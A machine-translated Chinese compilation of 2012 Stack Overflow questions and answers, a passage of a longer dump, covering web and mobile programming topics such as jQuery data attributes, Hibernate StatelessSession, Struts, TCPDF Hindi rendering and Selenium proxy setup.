' `Math.sqrt( a*a + b*b )`' 指的是[CSS-TRICKS](http://css-tricks.com/get-value-of-css-rotation-through-javascript/)。

# image - 在vituemart和joomla的产品详细信息页面中将拇指图像更改为原始图像

> ID：13524093
> 
> 赞同：0
> 
> 时间：2012-11-23T06:27:19.503
> 
> 标签：image, joomla, virtuemart

我正在使用 joomla 1.5。我在我的 joomla 应用程序中集成了 measuremart。如果我为某些产品添加一些图像，它会从前端准确地显示在产品的列表页面中。但是如果我点击产品，那么它会显示产品的详细信息。在详细信息页面中，我需要原始图像而不是缩略图。你能指导我，如何将缩略图图像更改为图像的原始大小。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T21:37:25.890

如果您使用的是 Virtuemart 2，则导航到 root/components/com_virtuemart/views/productdetails/tmpl/default_images.php

就像是

```
<?php   echo $this->product->images[0]->displayMediaFull('class="medium-image" id="medium-image"', false, "class='", true); ?> 
```

会做的伎俩，

# javascript - 如何设置strutsjava类中的值

> ID：13524094
> 
> 赞同：0
> 
> 时间：2012-11-23T06:27:22.280
> 
> 标签：javascript, jsp, struts-1

我有 ShowAction java 类，成功时会显示​​类 JSP 页面，该 jsp 页面包含

```
<bean:define id="stateTypes" name="sessionData" property="stateTypes"  />
<html:select property="issueStateCode" styleClass="smallDropInput" tabindex="5" styleId="myId">
    <html:options collection="stateTypes" property="value" labelProperty="label" />
</html:select> 
```

在我的 ShowAction java 类中，我正在为`<html:select>`(JSP) 设置值，如下所示：

```
sessionData.setStateTypes(TypeHelper.getTypeList(TypeHelper.TYPE_JURISDICTION,
            sessionData.getCarrierId(), sessionData.getProductId())); 
```

我想从列表中设置一个特定值，`<html:select>`当显示 JSP 时，该值会被选中或自动填充。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:59:33.620

将自动选择的选项是与`getIssueStateCode()`表单 bean 的方法返回的选项具有相同值的选项，因为标记的`property`属性是.`<html:select>``issueStateCode`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T13:01:32.980

得到解决方案。 `sessionData.getSession().setAttribute("issueBranch","SetValue"); //to set value that you wants to set`并在 JSP 中检索此值

```
<% String issueBranch= request.getSession().getAttribute("issueBranch").toString(); %>

    <html:hidden styleId="myText" property="issueBranch" value='<%=issueBranch %>' /> 
```

并在 JS 中设置值`var val=document.getElementById('myText').value; document.getElementById('myId').value=val; // myId is styleId or id attribute for <html:select>`

# hibernate - 什么是休眠中的数据混叠效应？

> ID：13524097
> 
> 赞同：8
> 
> 时间：2012-11-23T06:27:31.977
> 
> 标签：hibernate

我打算在休眠中使用这个 StatelessSession 接口。但不知道[这里解释的数据混叠效果是什么](http://docs.jboss.org/hibernate/core/3.6/reference/en-US/html/batch.html#batch-statelesssession)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-28T08:19:37.173

考虑像这样的数据

```
table parent
id | name
---------
1  | 'foo'

table child
id | parent_id
--------------
1  | 1
2  | 1 
```

和一个查询

```
session.query("from child").list(); 
```

那么以下将失败`StatelessSession session`但不会失败`Session session`

```
childs.get(0).getParent().setName("bar");

assertEqual("bar", childs.get(1).getParent().getName()); 
```

更新：

StatelessSession 不会“记住”它加载的对象，因此在脱水第二个孩子时，它不知道它已经创建了它所引用的父对象，并将创建另一个具有相同值但引用不同的父对象。

# iphone - 标签栏委托没有被调用

> ID：13524099
> 
> 赞同：0
> 
> 时间：2012-11-23T06:27:46.183
> 
> 标签：iphone, xcode4.2

我试图在每次按下标签栏按钮时捕获事件，并在下面的函数中添加 `UITabBarControllerDelegate`到`AppDelegate.h`文件`AppDelegate.m`但它没有被调用。我还将`tabBarController`代表连接到 IB 中的 First Responder

有人可以帮我解决这个问题吗？

// AppDelegate.h

`@interface AppDelegate : UIResponder <UIApplicationDelegate, UITabBarControllerDelegate>`

// AppDelegate.m

```
 - (void)tabBarController:(UITabBarController *)tabBarController didSelectViewController:(UIViewController *)viewController
{

   NSLog(@"Touched Tab\n");

} 
```

![在此处输入图像描述](../Images/65ef2a0e14130a0b8fe9fbcf0fc7d272.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T06:29:24.717

如果我正确理解了您的图形，则您的“代表”不应该是“第一响应者”（谁知道设置为什么；它可能是视图控制器，也可能是键盘，或者基本上是设置为急救人员... ）。

相反，您需要将委托设置为您编写的委托方法实际存在的对象或类（您的视图控制器？）。看起来委托应该设置为您的“ `AppDelegate`”对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:32:04.477

![在此处输入图像描述](../Images/69804d313a1330b8c0f3c26d1a11ce9b.png)

请使用 AppDelegate 而不是 FirstResponder 绑定您的委托。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-27T17:08:12.367

它所需要的只是下面函数中的两行来使委托工作。希望它可以为某人节省时间和挫败感。

// AppDelegate.m

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions 
```

{

```
 self.m_pTabBarController = (UITabBarController *)self.window.rootViewController;
  self.m_pTabBarController.delegate = self;
  return YES; 
```

}

// AppDelegate.h

```
@interface ftAppDelegate : UIResponder <UIApplicationDelegate, UITabBarControllerDelegate>{
IBOutlet UITabBarController *m_pTabBarController; 
```

}

@property (strong, nonatomic) UIWindow *window;

@property（非原子，保留）IBOutlet UITabBarController *m_pTabBarController;

@结尾

# javascript - JavaScript-如何从具有多个节点和数组的 Json 数组中获取值？

> ID：13524103
> 
> 赞同：-1
> 
> 时间：2012-11-23T06:28:41.723
> 
> 标签：javascript

> **可能重复：**
> [我有一个嵌套数据结构/JSON，如何访问特定值？](https://stackoverflow.com/questions/11922383/i-have-a-nested-data-structure-json-how-can-access-a-specific-value)

我有一个以下格式的 JSON 数据。我需要获取与“Non Veg”中具有 specialDeal 为 true 的商店名称对应的商店名称。（注意：只有一家商店将 specialDeal 设为 true）我将如何检索它。请帮忙。在此先感谢..请帮助我，因为我刚刚学习 Java。

```
 {"Food":
  {
   "Veg":
    {
        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"", 
        "discntType":"", "Store":"", "StoreType":"", "Fund":"",
        "FundDetails":[
                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},
                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}
        ]
     },
   "Non Veg":
        {
        "chicken":
                [
                {
                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",
                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",
                        "specialDeal":"", "promoStatus":"",
                        "FundDetails":[
                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},
                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}
                        ]
     },
     {
                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",
                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",
                        "specialDeal":"", "promoStatus":"",
                        "FundDetails":[
                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},
                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}
                        ]
     }
    ],
        "fish":
                [
                {
                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",
                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",
                        "specialDeal":"", "promoStatus":"",
                        "FundDetails":[
                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},
                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}
                        ]
                },
                {
                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",
                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",
                        "specialDeal":"", "promoStatus":"",
                        "FundDetails":[
                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},
                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}
                        ]
                }
                ],
        "egg":
                [
                {
                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",
                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",
                        "specialDeal":"", "promoStatus":"",
                        "discntVal":"", "FundVal":"", "FundBal":""
                },
                {
                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",
                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",
                        "specialDeal":"", "promoStatus":"",
                        "discntVal":"", "FundVal":"", "FundBal":""
                }
                         ]
        },
"isMember":"Y",
"orderId":"" 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:02:24.400

好的，所以 JSON 在某处缺少一些花括号 - 我认为它们在最后。

这是过程：

```
// s_json is the string form of your json response
var s_json='{"Food":  {   "Veg":    {        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",         "discntType":"", "Store":"", "StoreType":"", "Fund":"",        "FundDetails":[                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}        ]     },   "Non Veg":        {        "chicken":                [                {                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",                        "discntType":"", "Store":"result", "StoreType":"", "Fund":"",                        "specialDeal":"true", "promoStatus":"",                        "FundDetails":[                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}                        ]     },     {                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",                        "specialDeal":"", "promoStatus":"",                        "FundDetails":[                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}                        ]     }    ],        "fish":                [                {                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",                        "specialDeal":"", "promoStatus":"",                        "FundDetails":[                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}                        ]                },                {                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",                        "specialDeal":"", "promoStatus":"",                        "FundDetails":[                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""},                                {"status":"", "discntVal":"", "FundVal":"", "FundBal":""}                        ]                }                ],        "egg":                [                {                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",                        "specialDeal":"", "promoStatus":"",                        "discntVal":"", "FundVal":"", "FundBal":""                },                {                        "amtSpent":"", "shortDesc":"", "longDesc":"", "excTxt":"",                        "discntType":"", "Store":"", "StoreType":"", "Fund":"",                        "specialDeal":"", "promoStatus":"",                        "discntVal":"", "FundVal":"", "FundBal":""                }               ]        },"isMember":"Y","orderId":""}}';
// We use a json parser to turn the string into an object, o_json. In firefox, instead of using jQuery you could use JSON.parse(s_json). Other parsers are available in other frameworks/browsers
var o_json=jQuery.parseJSON(s_json);
// Initialize an empty string for the result
var result=""
// look in the o_json object for the food object property, then grab it's object property with the key "Non Veg". loop through each of the enumerable properties of this object, calling each one o_food
for each (o_food in o_json.Food["Non Veg"]) {
    // Loop through all the elements of the array o_food
    for (var i=0;i<o_food.length;i++) {
        // Does this element of the array have a property, specialDeal, whose value is "true"? If so, check the same element for a property called Store, and use it's value for the value of result
        if (o_food[i].specialDeal=="true") result=o_food[i].Store;
    }
}
// Alert the result
alert(result); 
```

您会注意到我稍微更改了您的 json，以便找到结果。一旦你使用了框架（如 jQuery）或某些浏览器中可用的本机 json 解析器（如 ff），你可以将 json 视为普通对象

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:05:17.437

你可以试试这个：

```
var nonVeg = jsonData.Food['Non Veg']; // jsonData is json data which you have given above
for(var key in nonVeg) {
  for(var i=0; i<nonVeg[key].length; i++) { 
     var storeObj = nonVeg[key][i];
     if(storeObj['specialDeal']== 'true'){ 
        console.log(storeObj['Store']);
     }
  }
} 
```

因为我们只对 JSON 的 Non Veg 部分感兴趣，所以我们可以将它存储到某个变量中，即 `var nonVeg = jsonData.Food['Non Veg'];` 现在我们可以将 nonVeg 单独称为一个对象。在这个对象中它有几个对象，所以让我们用 for 循环遍历每个对象，并将其存储到一个名为`storeObj`. 由于 storeObj 有许多键值参数，因此可以`storeObj`使用 for 循环对每个参数进行迭代。最后让我们检查一下该`specialDeal`属性的值是否为`true`? 如果是，那么`console.log`它的“存储”属性即。`storeObj['Store']`.

# c - C 编译器错误中的“需要左值”是什么意思？

> ID：13524104
> 
> 赞同：1
> 
> 时间：2012-11-23T06:28:44.710
> 
> 标签：c, lvalue

```
 #include<stdio.h>   //line 1
 #include<conio.h>   //line 2
 void main()         //line 3
 {                   //line 4
   int a=6,g=7,b=3;    //line 5
   clrscr();           //line 6
   printf("%d",a>?g=a:g=b); //line 7
   getch();                //line 8
 } 
```

案例1：保存文件之前

这将在第 7 行“需要左值”处给出错误。但是当我编译时不会出现错误，运行后会产生输出 3。

案例2：保存文件后

当我们保存这个文件时，我们得到一个错误“需要左值”。

对不起我的错误并在这里写下问题

```
 #include<stdio.h>   //line 1
    #include<conio.h>   //line 2
    void main()         //line 3
    {                   //line 4
    int a=6,g=7,b=3;    //line 5
    clrscr();           //line 6
    printf("%d",a>b?g=a:g=b); //line 7**
    getch();                //line 8
    } 
```

案例1：保存文件之前

这将在第 7 行“需要左值”处给出错误。但是当我编译时不会出现错误，运行后会产生输出 3。

案例2：保存文件后

当我们保存这个文件时，我们得到一个错误“需要左值”。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T06:40:01.683

“需要左值”意味着您不能将值分配给在内存中没有位置的东西。基本上，您需要一个变量才能分配一个值。

在您的特定情况下，我会删除`a>g=a:g=b`它并用更易于理解的内容替换它，因为在当前状态下，没有人（包括您和您的编译器）对它应该是什么有丝毫的了解。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:48:22.057

这： printf("%d",a>g=a:g=b); 没有意义。我不知道您是否要在其中设置一个条件，这是您永远不应该做的，尤其是对于如此简单的事情。

您应该阅读 printf 的工作原理，因为您不了解需要什么，就像这样：

```
int a = 1;
printf("%d",a); 
```

或者您打算使用其他东西，但我从未见过像您之前在这里所做的那样 a>g=a:g=b 的语法。

# wso2 - WSO2 ESB 插件开发

> ID：13524105
> 
> 赞同：1
> 
> 时间：2012-11-23T06:28:56.107
> 
> 标签：wso2, esb, wso2esb

我想使用 WSO2 ESB 解决方案进行两种服务的通信（显然不足为奇），一个端点是使用 REST 服务与外界进行通信。这是问题的开始。由于我是新人，我不知道从哪里开始。我读过一些关于 WSO2 ESB 的文章，但是为了能够快速开始你的加速参考会很有帮助。

我想与之交谈的服务称为 BeBanjo。

# c# - c#中栈顶对象的调用函数

> ID：13524106
> 
> 赞同：-1
> 
> 时间：2012-11-23T06:28:56.917
> 
> 标签：c#, stack

我想要完成的是访问位于堆栈顶部的对象的方法，如下所示：

```
var stack = new Stack();
var obj1 = new Foo(stack); //has method called Bar, and reference to stack
stack.Push(obj1);
stack.Peek().Bar(); 
```

我想使用堆栈而不是数组，因为函数 Bar 会在执行结束时将自己从堆栈中弹出。有没有办法用堆栈来做到这一点，还是我需要得到一个列表？我认为 Peek 返回堆栈顶部而不弹出。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T06:31:24.647

请参阅[msdn 资源](http://msdn.microsoft.com/en-us/library/3278tedw.aspx)。

`Stack<T>`支持`Push()`,`Peek()`和`Pop()`.

或者我不理解你的问题。

# jquery - 如何在 HTML 元素中设置数据属性

> ID：13524107
> 
> 赞同：307
> 
> 时间：2012-11-23T06:29:10.757
> 
> 标签：jquery, html, custom-data-attribute

我有一个带有属性的 div `data-myval = "10"`。我想更新它的价值；如果我使用它不会改变`div.data('myval',20)`吗？我`div.attr('data-myval','20')`只需要使用吗？

我对 HTML5 和 jQuery 感到困惑吗？请指教。谢谢！

编辑：更新`div.data('myval')=20`为`div.data('myval',20)`，但 HTML 仍未更新。

* * *

## 回答 #1

> 赞同：568
> 
> 时间：2012-11-23T06:32:09.333

**HTML**

```
<div id="mydiv" data-myval="10"></div> 
```

**JS**

```
var a = $('#mydiv').data('myval'); //getter

$('#mydiv').data('myval',20); //setter 
```

[演示](http://jsfiddle.net/jashwant/Se5Zu/)

[参考](http://api.jquery.com/data/)

从参考：

> jQuery 本身使用该`.data()`方法将信息保存在名称 'events' 和 'handle' 下，并且还保留任何以下划线（'_'）开头的数据名称供内部使用。

应该注意的是，jQuery`data()`不会改变`data`HTML 中的属性。

因此，如果您需要更改`data`HTML 中的属性，则应使用`.attr()`。

**HTML**

```
<div id="outer">
    <div id="mydiv" data-myval="10"></div>
</div> 
```

**JS：**

```
alert($('#outer').html());   // alerts <div id="mydiv" data-myval="10"> </div>
var a = $('#mydiv').data('myval'); //getter
$('#mydiv').attr("data-myval","20"); //setter
alert($('#outer').html());   //alerts <div id="mydiv" data-myval="20"> </div> 
```

看[这个演示](http://jsfiddle.net/jashwant/Se5Zu/2/)

* * *

## 回答 #2

> 赞同：55
> 
> 时间：2012-11-23T07:47:52.157

# Vanilla Javascript 解决方案

**HTML**

```
<div id="mydiv" data-myval="10"></div> 
```

**JavaScript：**

*   使用 DOM 的[`getAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/getAttribute)属性

    ```
     var brand = mydiv.getAttribute("data-myval")//returns "10"
     mydiv.setAttribute("data-myval", "20")      //changes "data-myval" to "20"
     mydiv.removeAttribute("data-myval")         //removes "data-myval" attribute entirely 
    ```

*   使用 JavaScript 的[`dataset`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset)属性

    ```
    var myval = mydiv.dataset.myval     //returns "10"
    mydiv.dataset.myval = '20'          //changes "data-myval" to "20"
    mydiv.dataset.myval = null          //removes "data-myval" attribute 
    ```

* * *

## 回答 #3

> 赞同：53
> 
> 时间：2016-08-16T17:12:52.107

您还可以使用以下`attr`内容；

**HTML**

```
<div id="mydiv" data-myval="JohnCena"></div> 
```

**脚本**

```
 $('#mydiv').attr('data-myval', 'Undertaker'); // sets 
 $('#mydiv').attr('data-myval'); // gets 
```

或者

```
$('#mydiv').data('myval'); // gets value
$('#mydiv').data('myval','John Cena'); // sets value 
```

* * *

## 回答 #4

> 赞同：34
> 
> 时间：2014-09-24T17:25:03.493

请注意，`.data()`当您使用 javascript 更改 html5`data-`属性时，jQuery 不会更新。

如果您使用 jQuery在 HTML 元素`.data()`中设置`data-`属性，则最好使用 jQuery`.data()`来读取它们。否则，如果您动态更新属性，可能会出现不一致。例如，请参见下面的`setAttribute()`、`dataset()`、`attr()`。更改值，按几次按钮并查看控制台。

```
$("#button").on("click", function() {
  var field = document.querySelector("#textfield")

  switch ($("#method").val()) {
    case "setAttribute":
      field.setAttribute("data-customval", field.value)
      break;
    case "dataset":
      field.dataset.customval = field.value
      break;
    case "jQuerydata":
      $(field).data("customval", field.value)
      break;
    case "jQueryattr":
      $(field).attr("data-customval", field.value)
      break;
  }

  objValues = {}
  objValues['$(field).data("customval")'] = $(field).data("customval")
  objValues['$(field).attr("data-customval")'] = $(field).attr("data-customval")
  objValues['field.getAttribute("data-customval")'] = field.getAttribute("data-customval")
  objValues['field.dataset.customval'] = field.dataset.customval

  console.table([objValues])
})
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<h1>Example</h1>
<form>
  <input id="textfield" type="text" data-customval="initial">
  <br/>
  <input type="button" value="Set and show in console.table (F12)" id="button">
  <br/>
  <select id="method">
    <option value="setAttribute">setAttribute</option>
    <option value="dataset">dataset</option>
    <option value="jQuerydata">jQuery data</option>
    <option value="jQueryattr">jQuery attr</option>
  </select>
  <div id="results"></div>
</form>
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2012-11-23T06:31:45.630

如果您使用的是 jQuery，请使用`.data()`：

```
div.data('myval', 20); 
```

您可以使用 存储任意数据`.data()`，但使用时仅限于字符串`.attr()`。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2020-01-29T15:02:30.013

为了使 jQuery 和 DOM 保持同步，一个简单的选项可能是

```
$('#mydiv').data('myval',20).attr('data-myval',20); 
```

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2017-12-17T07:38:25.303

## [jQuery] .data() 与 .attr() 与 .extend()

`.data()`如果我是正确的，jQuery 方法通过使用该方法更新由 jQuery 管理的内部对象。

如果你想`data-attributes`用一些传播来更新你的，使用 -

```
$('body').attr({ 'data-test': 'text' }); 
```

- 否则，`$('body').attr('data-test', 'text');`将工作得很好。

您可以实现此目的的另一种方法是使用 -

```
$.extend( $('body')[0].dataset, { datum: true } ); 
```

- 这将任何属性更改限制为`HTMLElement.prototype.dataset`，*而不是任何附加`HTMLElement.prototype.attributes`*。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2019-08-26T15:23:26.037

另一种设置 data- 属性的方法是使用[dataset](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset)属性。

```
<div id="user" data-id="1234567890" data-user="johndoe" data-date-of-birth>John Doe</div>

const el = document.querySelector('#user');

// el.id == 'user'
// el.dataset.id === '1234567890'
// el.dataset.user === 'johndoe'
// el.dataset.dateOfBirth === ''

// set the data attribute
el.dataset.dateOfBirth = '1960-10-03'; 
// Result: el.dataset.dateOfBirth === 1960-10-03

delete el.dataset.dateOfBirth;
// Result: el.dataset.dateOfBirth === undefined

// 'someDataAttr' in el.dataset === false
el.dataset.someDataAttr = 'mydata';
// Result: 'someDataAttr' in el.dataset === true 
```

# c# - 将数据从控制器发送到视图的最安全和最干净的方法是什么？

> ID：13524108
> 
> 赞同：2
> 
> 时间：2012-11-23T06:29:16.640
> 
> 标签：c#, asp.net-mvc-3

我有这个问题我正在寻找答案，我看到了这个问题的答案

[ViewData 和 ViewBag 有什么区别？](https://stackoverflow.com/questions/4705426/whats-the-difference-between-viewdata-and-viewbag)

许多人在回答中提到既不使用 ViewBag 也不使用 ViewData 是“安全的”。我不明白为什么，因为我对 Web 应用程序及其整个概念以及整个 MVC 都是新手。所以我的问题是：

1.  为什么 ViewBag 和 ViewData 不是传递数据的安全方式？
2.  传递数据的最佳方式是什么？（最重要的问题）

我真的很感谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:30:51.760

有过争论。我总是使用特定的视图模型。

您也可以使用 ViewBag 或 ViewData 但不是首选。

ViewData 不安全，因为，

`ViewData["foo"]`可能未在控制器中设置，但您尝试访问它，因此您将失败。因此`ViewBag`介绍了它使用语言的动态特性。

所以 ViewData 更安全一些。然而，作为一个好的设计，为每个视图创建视图模型对象是理想的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T06:59:54.713

另一种方法是强类型模型对象。有些人更喜欢这个，因为它可以防止在使用动态 ViewBag 对象时可能发生的一些运行时异常。它还允许使用自动完成等有用的 IDE 功能，并倾向于生成更易读的代码。

Microsoft 的 Rick Anderson有一篇很好的[博客文章](http://blogs.msdn.com/b/rickandy/archive/2011/01/28/dynamic-v-strongly-typed-views.aspx)描述并提供了不同选项的示例，您可能会发现这些选项很有用。

如果强类型选项看起来像您想要追求的东西，本教程可能会很有用：[http ://www.asp.net/mvc/tutorials/mvc-4/getting-started-with-aspnet-mvc4/accessing -your-models-data-from-a-controller](http://www.asp.net/mvc/tutorials/mvc-4/getting-started-with-aspnet-mvc4/accessing-your-models-data-from-a-controller)

# jquery - 添加一些 jquery 代码后，jQuery mobile List-View 不起作用

> ID：13524113
> 
> 赞同：1
> 
> 时间：2012-11-23T06:29:47.220
> 
> 标签：jquery, jquery-mobile

我正在使用 jquery mobile 并且我在 jquery 中有一个数组 makeArray 并且我通过数组的值创建了几个列表视图。一切正常。但是没有显示 jquery mobile 样式的列表视图。而是显示一个没有样式的普通列表视图。这是我的代码：

```
$(document).ready(function(){
        var url = "inventory/inventory.json";
        var makeArray = new Array();
        $.getJSON(url, function(data){
            $.each(data, function(index, item){
                if(($.inArray(item.make, makeArray)) == -1){
                    makeArray.push(item.make);
                    $('.upper_case')
                    .append('<li data-icon="list-arrow"> <a href="trade_form.php?='+ item.make +'"><img src="images/car_logo/buick.png" class="ui-li-thumb"/>' + item.make + '</a></li>');
                }
            });
        });
      }); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T07:06:57.983

您需要刷新列表视图：

```
 $('upper_case').listview('refresh'); 
```

# c# - 将动态磁贴图像设置为 Web 图像

> ID：13524117
> 
> 赞同：0
> 
> 时间：2012-11-23T06:30:09.757
> 
> 标签：c#, windows-phone-7.1

我正在尝试使用从 Internet 检索到的图像更新我的图块。在我的应用程序中，我尝试将 Live Tile 背景图像设置为这些图像之一。但是，简单地使用在线 URL 似乎不起作用，我无法弄清楚我应该如何保存和使用图像。

我如何在 Windows Phone 7.1 中完成此操作？

一个示例图像是

![在此处输入图像描述](../Images/6b50f71dfc9d7cc86706e44873902feb.png)

# php - 印地语无法在 tcpdf 上正确显示

> ID：13524132
> 
> 赞同：14
> 
> 时间：2012-11-23T06:31:30.573
> 
> 标签：php, utf-8, tcpdf, hindi

我创建了以下代码，用于在 tcpdf 中使用 arial unicode 字体显示印地语文本

```
$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);

// set default monospaced font
$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);

//set some language-dependent strings
$pdf->setLanguageArray($l);

// ---------------------------------------------------------

$pdf->addTTFfont('fonts/ARIALUNI.TTF', 'TrueTypeUnicode', '', 32);
$pdf->SetFont('arialuni', '', 10,'false');

$txt = 'hindi text with arial unicode समृध्दि';

$pdf->Write(0, $txt, '', 0, 'L', true, 0, false, false, 0);

// ---------------------------------------------------------

//Close and output PDF document
$pdf->Output('example_038.pdf', 'I'); 
```

但它没有正确显示

但在 php 中它显示正确的文本。

请告诉我是否有什么问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-05T15:15:18.380

尝试[使用 mPDF](http://www.mpdf1.com)作为替代方案。它非常好且易于使用。这是它如何显示印地语[的示例](http://mpdf1.com/examples/example_utf8.pdf)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T17:04:39.280

我会尝试[mpdf1.com](http://mpdf1.com/) 我之前尝试过，它适用于印地语

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-30T11:30:21.797

字体可能有问题。

尝试替换以下行并尝试另一种字体：

```
$pdf->addTTFfont('fonts/ARIALUNI.TTF', 'TrueTypeUnicode', '', 32);
$pdf->SetFont('arialuni', '', 10,'false'); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-07-25T20:17:38.370

试试这个，它有效。

$mpdf->SetAutoFont();

# java - 通过使用可调用语句的过程从 mysql 数据库中选择数据

> ID：13524133
> 
> 赞同：0
> 
> 时间：2012-11-23T06:31:40.620
> 
> 标签：java, mysql

我创建了一个简单的程序来计算编号。mysql 数据库中表的行数。如何使用可调用语句从 java 类中打印出计数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T06:48:09.980

假设您已经与数据库建立了连接并且您的过程将计数返回为 varchar2 这应该足够了

```
public void getCount() {

    Statement stmt = null;
    CallableStatement cstmt = null;

    try {

        stmt = con.createStatement();

        //p_get_count should be replaced by your procedure name
        String s1 = "call p_get_count(?); end;";
        cstmt = (CallableStatement) con.prepareCall(s1);
        cstmt.registerOutParameter(1, Types.VARCHAR);
        cstmt.execute();
        String s2 = cstmt.getString(1);
        System.out.println(s2);
        cstmt.close();
        stmt.close();

    } catch (SQLException e) {

        e.printStackTrace();

    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:08:34.117

如果您使用 JPA 或 Hibernate 作为 ORM，那么您可以查找[NamedQuery](http://docs.oracle.com/javaee/5/api/javax/persistence/NamedQuery.html)，它将有助于实现您想要做的事情。

# java - 无法在 Java 中设置 Firefox 配置文件和代理设置和身份验证

> ID：13524142
> 
> 赞同：0
> 
> 时间：2012-11-23T06:32:15.423
> 
> 标签：java, selenium, selenium-webdriver

亲爱的 Selenium Webdriver 大师，

我进行了以下 Firefox 配置文件设置更改，以尝试在使用 Selenium Webdriver 2 启动 Firefox 时拾取 FireBug：

```
public static void main(String[] args) 
{
    File fireBugFile = new File("C:/selenium-ide-1.9.0.xpi");
    FirefoxProfile firefoxProfile = new FirefoxProfile();
    firefoxProfile.addExtension(fireBugFile);
    firefoxProfile.setPreference("network.proxy.type", 1);
    firefoxProfile.setPreference("network.proxy.http", "proxyserver");
    firefoxProfile.setPreference("network.proxy.http_port", "80");
    firefoxProfile.setPreference("extensions.firebug.currentVersion", "1.9.0");

    String urlStrProxy = "http://www.example.com/",
    proxy = "proxyserver",
    port = "80",
    username = "jack",
    password = "XXXXXXX";

    Authenticator.setDefault(new SimpleAuthenticator(username,password));
    Properties systemProperties = System.getProperties();
    systemProperties.setProperty("http.proxyHost",proxy);
    systemProperties.setProperty("http.proxyPort","80");

    WebDriver driverMainPage = new FirefoxDriver(firefoxProfile);
}

public class SimpleAuthenticator extends Authenticator
{
   private String username, password;

   public SimpleAuthenticator(String username,String password)
   {
       this.username = username;
       this.password = password;
   }

   protected PasswordAuthentication getPasswordAuthentication()
   {
       return new PasswordAuthentication(username,password.toCharArray());
   }
} 
```

还尝试在 Firefox 访问 www.abc.com 时未成功访问 www.abc.com 时，将代理设置和身份验证详细信息与附加语句包含在代理服务器中，而无需通过弹出屏幕手动输入：

